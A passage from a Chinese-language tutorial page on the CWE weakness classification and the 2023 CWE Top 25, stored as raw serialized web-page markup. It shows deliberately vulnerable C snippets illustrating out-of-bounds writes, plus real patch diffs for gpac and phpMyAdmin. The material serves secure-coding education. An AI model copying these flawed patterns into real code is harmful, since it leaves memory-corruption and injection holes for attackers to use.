operator\"\u003e::\u003c/span\u003e\u003cspan class=\"token constant\"\u003eHTTP_BAD_REQUEST\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token variable\"\u003e$response\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003e\u003cspan class=\"token function\"\u003esetData\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'error'\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token class-name static-context\"\u003eTranslation\u003c/span\u003e\u003cspan class=\"token operator\"\u003e::\u003c/span\u003e\u003cspan class=\"token function\"\u003eget\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'err_sendMail'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ebreak\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"9:[[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/index.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"关于CWE\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"x-inline-strong\\\"\u003e通用缺陷枚举\u003c/span\u003e\u003ccode class=\\\"x-inline-highlight\\\"\u003e(Common Weakness Enumeration, CWE)\u003c/code\u003e是针对硬件和软件弱点和漏洞的分类系统。该项目由美国国土安全部（DHS）网络安全和基础设施安全局（CISA）办公室赞助，由MITRE公司运营。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"相比于CVE记录描述产品中出现的漏洞，侧重于漏洞利用的技术影响，CWE对可能导致漏洞的常见缺陷或弱点进行分类，描述漏洞发生的根本原因。\"}}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"术语\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"下面的内容译自\u003ca href=\\\"https://cwe.mitre.org/documents/glossary/\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCWE Glossary\u003c/a\u003e，这里只列出了几个下文可能出现的术语：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eBehaviour\u003c/code\u003e（行为）：\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"产品采取的操作，通常以代码实现或以算法表示。也可以指系统以外的其他参与者的操作。\"}}]]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eResource\u003c/code\u003e（资源）：\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"指在产品运行过程中被访问或修改的对象或实体，例如内存、CPU、文件或套接字。资源可以是系统级（内存或CPU）、代码级（函数或变量）或应用程序级（cookie或消息）。\"}}]]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eProperty\u003c/code\u003e（属性）：\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"指某个对系统预期的安全模型很重要的资源或行为，可能随时间变化。比如用户的输入最初是不受信任的，但经过系统的中和处理后，最终会被认为是受信任的。\"}}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"CWE分类系统\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"CWE有一套树型的分类系统，CWE提供了一些组织各个条目的结构化描述，例如视图和分类。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"CWE Views是针对特定目的或特定受众而组织的弱点集合，大多数视图是整个CWE列表的子集。例如\u003ca href=\\\"https://cwe.mitre.org/data/index.html\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCWE List\u003c/a\u003e中给出的：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ca href=\\\"https://cwe.mitre.org/data/definitions/699.html\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eView by Software Development\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ca href=\\\"https://cwe.mitre.org/data/definitions/1194.html\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eView by Hardware Design\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ca href=\\\"https://cwe.mitre.org/data/definitions/1000.html\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eView by Research Concepts\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"CWE Categories是更细的划分，一个CWE分类可能包含一系列具有共同特征的CWE条目。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"CWE的不同条目也具有不同的抽象程度，有些条目描述了具体的缺陷，有些则描述了更一般的问题。CWE的条目之间也存在父级子级的关系。四种抽象程度如下图所示：\"}}],[\"$\",\"$L14\",null,{\"src\":\"weakness_abstractions.png\",\"width\":\"600px\",\"filterDarkTheme\":true}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这些分级在官网上也有对应的图标表示，相应的释义为：\"}}],[\"$\",\"div\",null,{\"className\":\"x-table-wrapper\",\"children\":[\"$\",\"table\",null,{\"className\":\"x-table\",\"children\":[\"$\",\"tbody\",null,{\"children\":[[\"$\",\"tr\",\"0\",{\"children\":[[\"$\",\"th\",\"0\",{\"className\":null,\"width\":null,\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"icon\"}}]}],[\"$\",\"th\",\"1\",{\"className\":\"x-cell-align-l\",\"width\":null,\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"释义\"}}]}]]}],[\"$\",\"tr\",\"1\",{\"children\":[[\"$\",\"td\",\"0\",{\"className\":null,\"width\":null,\"children\":[\"$\",\"$L14\",null,{\"src\":\"view.png\",\"width\":\"16px\"}]}],[\"$\",\"td\",\"1\",{\"className\":\"x-cell-align-l\",\"width\":null,\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eView\u003c/code\u003e，视图。\"}}]}]]}],[\"$\",\"tr\",\"2\",{\"children\":[[\"$\",\"td\",\"0\",{\"className\":null,\"width\":null,\"children\":[\"$\",\"$L14\",null,{\"src\":\"category.png\",\"width\":\"16px\"}]}],[\"$\",\"td\",\"1\",{\"className\":\"x-cell-align-l\",\"width\":null,\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eCategory\u003c/code\u003e，分类，一系列有共同特征的CWE条目。\"}}]}]]}],[\"$\",\"tr\",\"3\",{\"children\":[[\"$\",\"td\",\"0\",{\"className\":null,\"width\":null,\"children\":[\"$\",\"$L14\",null,{\"src\":\"pillar.png\",\"width\":\"16px\"}]}],[\"$\",\"td\",\"1\",{\"className\":\"x-cell-align-l\",\"width\":null,\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePillar\u003c/code\u003e，最抽象的CWE条目类型，但与\u003ccode class=\\\"x-inline-highlight\\\"\u003eCategory\u003c/code\u003e相比，仍然是从“技术上”对缺陷类型进行描述。\"}}]}]]}],[\"$\",\"tr\",\"4\",{\"children\":[[\"$\",\"td\",\"0\",{\"className\":null,\"width\":null,\"children\":[\"$\",\"$L14\",null,{\"src\":\"class.png\",\"width\":\"16px\"}]}],[\"$\",\"td\",\"1\",{\"className\":\"x-cell-align-l\",\"width\":null,\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eClass\u003c/code\u003e，较为抽象的CWE条目类型，通常独立于特定的语言或技术。\u003cbr/\u003e\u003ccode class=\\\"x-inline-highlight\\\"\u003eClass\u003c/code\u003e级别的CWE通常从【行为、属性、资源】中的\u003ccode class=\\\"x-inline-highlight\\\"\u003e1\u003c/code\u003e~\u003ccode class=\\\"x-inline-highlight\\\"\u003e2\u003c/code\u003e个方面来描述问题。\"}}]}]]}],[\"$\",\"tr\",\"5\",{\"children\":[[\"$\",\"td\",\"0\",{\"className\":null,\"width\":null,\"children\":[\"$\",\"$L14\",null,{\"src\":\"base.png\",\"width\":\"16px\"}]}],[\"$\",\"td\",\"1\",{\"className\":\"x-cell-align-l\",\"width\":null,\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eBase\u003c/code\u003e，较为抽象的CWE条目类型，通常也是独立于资源或技术。\u003cbr/\u003e\u003ccode class=\\\"x-inline-highlight\\\"\u003eBase\u003c/code\u003e级别的CWE通常从【行为、属性、技术、语言、资源】中的\u003ccode class=\\\"x-inline-highlight\\\"\u003e2\u003c/code\u003e~\u003ccode class=\\\"x-inline-highlight\\\"\u003e3\u003c/code\u003e个方面来描述问题。\"}}]}]]}],[\"$\",\"tr\",\"6\",{\"children\":[[\"$\",\"td\",\"0\",{\"className\":null,\"width\":null,\"children\":[\"$\",\"$L14\",null,{\"src\":\"variant.png\",\"width\":\"16px\"}]}],[\"$\",\"td\",\"1\",{\"className\":\"x-cell-align-l\",\"width\":null,\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eVariant\u003c/code\u003e，通常与特定种类的产品有关系，一般包含特定的语言或技术。\u003cbr/\u003e\u003ccode class=\\\"x-inline-highlight\\\"\u003eVariant\u003c/code\u003e级别的CWE通常从【行为、属性、技术、语言、资源】中的\u003ccode class=\\\"x-inline-highlight\\\"\u003e3\u003c/code\u003e~\u003ccode class=\\\"x-inline-highlight\\\"\u003e5\u003c/code\u003e个方面来描述问题。\"}}]}]]}],[\"$\",\"tr\",\"7\",{\"children\":[[\"$\",\"td\",\"0\",{\"className\":null,\"width\":null,\"children\":[\"$\",\"$L14\",null,{\"src\":\"composite.png\",\"width\":\"16px\"}]}],[\"$\",\"td\",\"1\",{\"className\":\"x-cell-align-l\",\"width\":null,\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eComposite\u003c/code\u003e，此类缺陷需要多种缺陷同时存在，才会引发潜在的安全漏洞。数量较少。\"}}]}]]}],[\"$\",\"tr\",\"8\",{\"children\":[[\"$\",\"td\",\"0\",{\"className\":null,\"width\":null,\"children\":[\"$\",\"$L14\",null,{\"src\":\"chain.png\",\"width\":\"30px\"}]}],[\"$\",\"td\",\"1\",{\"className\":\"x-cell-align-l\",\"width\":null,\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eChain\u003c/code\u003e，呈链式关系，例如缺陷X为缺陷Y的发生创造了条件。数量较少。\u003cbr/\u003e\u003ccode class=\\\"x-inline-highlight\\\"\u003eChain\u003c/code\u003e可以涉及两个以上的弱点，在某些情况下也可能具有树状结构。\"}}]}]]}]]}]}]}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"View of CWE Top 25 (2023)\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"（2023年）前25个最危险的软件缺陷，按顺序排名。标题前的【\u003ccode class=\\\"x-inline-highlight\\\"\u003eP\u003c/code\u003e/\u003ccode class=\\\"x-inline-highlight\\\"\u003eC\u003c/code\u003e/\u003ccode class=\\\"x-inline-highlight\\\"\u003eB\u003c/code\u003e/\u003ccode class=\\\"x-inline-highlight\\\"\u003eV\u003c/code\u003e/\u003ccode class=\\\"x-inline-highlight\\\"\u003eCompo\u003c/code\u003e】标识了其抽象类型。\"}}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/787.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-787: Out-of-bounds Write\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"越界写入，在预期缓冲区末尾之后或开头之前写入。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"int id_sequence[3];\\n\\n/* Populate the id array. */\\n\\nid_sequence[0] = 123;\\nid_sequence[1] = 234;\\nid_sequence[2] = 345;\\nid_sequence[3] = 456;\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$16\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"写入\u003ccode class=\\\"x-inline-highlight\\\"\u003eid_sequence[3]\u003c/code\u003e越界了。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"int returnChunkSize(void *)\\n{\\n    /* if chunk info is valid, return the size of usable memory,\\n    * else, return -1 to indicate an error.\\n    */\\n    ...\\n}\\nint main()\\n{\\n    ...\\n    memcpy(destBuf, srcBuf, (returnChunkSize(destBuf) - 1));\\n    ...\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$17\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ereturnChunkSize()\u003c/code\u003e遇到错误会返回\u003ccode class=\\\"x-inline-highlight\\\"\u003e-1\u003c/code\u003e，但是\u003ccode class=\\\"x-inline-highlight\\\"\u003ememcpy()\u003c/code\u003e假定传入的参数是\u003ccode class=\\\"x-inline-highlight\\\"\u003eunsigned\u003c/code\u003e，此时负值会被转换成相当大的数值。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 3\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"char *copy_input(char *user_supplied_string)\\n{\\n    int i, dst_index;\\n    char *dst_buf = (char *)malloc(4 * sizeof(char) * MAX_SIZE);\\n    if (MAX_SIZE \u003c= strlen(user_supplied_string))\\n    {\\n        die(\\\"user string too long, die evil hacker!\\\");\\n    }\\n    dst_index = 0;\\n    for (i = 0; i \u003c strlen(user_supplied_string); i++)\\n    {\\n        if ('\u0026' == user_supplied_string[i])\\n        {\\n            dst_buf[dst_index++] = '\u0026';\\n            dst_buf[dst_index++] = 'a';\\n            dst_buf[dst_index++] = 'm';\\n            dst_buf[dst_index++] = 'p';\\n            dst_buf[dst_index++] = ';';\\n        }\\n        else if ('\u003c' == user_supplied_string[i])\\n        {\\n            /* encode to \u0026lt; */\\n        }\\n        else\\n            dst_buf[dst_index++] = user_supplied_string[i];\\n    }\\n    return dst_buf;\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$18\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"虽然前面做了长度检查，但是后续的逻辑将\u003ccode class=\\\"x-inline-highlight\\\"\u003e'\u0026'\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003e'\u0026#60;'\u003c/code\u003e转为HTML实体时，可能导致长度增长。如果恶意构造包含大量\u003ccode class=\\\"x-inline-highlight\\\"\u003e'\u0026'\u003c/code\u003e的输入，可能导致越界写入。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2023-0841\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2023-0841\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://github.com/gpac/gpac/issues/2396\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/gpac/gpac/issues/2396\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/gpac/gpac/commit/851560e3dc8155d45ace4b0d77421f241ed71dc4\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/gpac/gpac/commit/851560e3dc8155d45ace4b0d77421f241ed71dc4\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"补丁：考虑\u003ccode class=\\\"x-inline-highlight\\\"\u003ebytes_skipped\u003c/code\u003e。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"if (!ctx-\u003ein_seek) {\\n    if (size \u003e remain) {\\n        GF_LOG(GF_LOG_WARNING, GF_LOG_MEDIA, (\\\"[MP3Dmx] truncated frame of size %u (remains %u)\\\\n\\\", size, remain));\\n    if (bytes_skipped + size \u003e remain) {\\n        GF_LOG(GF_LOG_WARNING, GF_LOG_MEDIA, (\\\"[MP3Dmx] truncated frame of size %u (remains %d)\\\\n\\\", size, remain-bytes_skipped));\\n        break;\\n    }\\n    dst_pck = gf_filter_pck_new_alloc(ctx-\u003eopid, size, \u0026output);\\n    if (!dst_pck) break;\\n    memcpy(output, sync, size);\\n    gf_filter_pck_set_cts(dst_pck, ctx-\u003ects);\\n    gf_filter_pck_set_duration(dst_pck, nb_samp);\\n    gf_filter_pck_set_sap(dst_pck, GF_FILTER_SAP_1);\\n    gf_filter_pck_set_framing(dst_pck, GF_TRUE, GF_TRUE);\\n    if (ctx-\u003ebyte_offset != GF_FILTER_NO_BO) {\\n        gf_filter_pck_set_byte_offset(dst_pck, ctx-\u003ebyte_offset + bytes_skipped);\\n    }\\n    gf_filter_pck_send(dst_pck);\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 48px, var(--bg-transparent-red) 48px 96px, transparent 96px, transparent 96px, var(--bg-transparent-green) 96px 144px, transparent 144px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$19\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/79.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"跨站脚本攻击。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-gray\",\"children\":[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"详见\u003ca href=\\\"/24b/cross-site-scripting/\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eLearn XSS\u003c/a\u003e。\"}}]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2014-8958\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2014-8958\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/phpmyadmin/phpmyadmin/commit/d32da348c4de2379482a48661ce968a55eebe5c4\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/phpmyadmin/phpmyadmin/commit/d32da348c4de2379482a48661ce968a55eebe5c4\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/phpmyadmin/phpmyadmin/commit/2ffdbf2d7daa0b92541d8b754e2afac555d3ed21\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/phpmyadmin/phpmyadmin/commit/2ffdbf2d7daa0b92541d8b754e2afac555d3ed21\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"部分补丁的内容：通过\u003ccode class=\\\"x-inline-highlight\\\"\u003ehtmlspecialchars()\u003c/code\u003e转义为HTML实体。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$html .= '\u003ctd\u003e' . $type . '\u003cbdo dir=\\\"ltr\\\"\u003e\u003c/bdo\u003e\u003c/td\u003e';\\n$html .= '\u003ctd\u003e' . htmlspecialchars($type) . '\u003cbdo dir=\\\"ltr\\\"\u003e\u003c/bdo\u003e\u003c/td\u003e';\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$html\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e.=\u003c/span\u003e \u003cspan class=\\\"token string single-quoted-string\\\"\u003e'\u0026lt;td\u003e'\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e.\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$type\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e.\u003c/span\u003e \u003cspan class=\\\"token string single-quoted-string\\\"\u003e'\u0026lt;bdo dir=\\\"ltr\\\"\u003e\u0026lt;/bdo\u003e\u0026lt;/td\u003e'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$html\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e.=\u003c/span\u003e \u003cspan class=\\\"token string single-quoted-string\\\"\u003e'\u0026lt;td\u003e'\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e.\u003c/span\u003e \u003cspan class=\\\"token 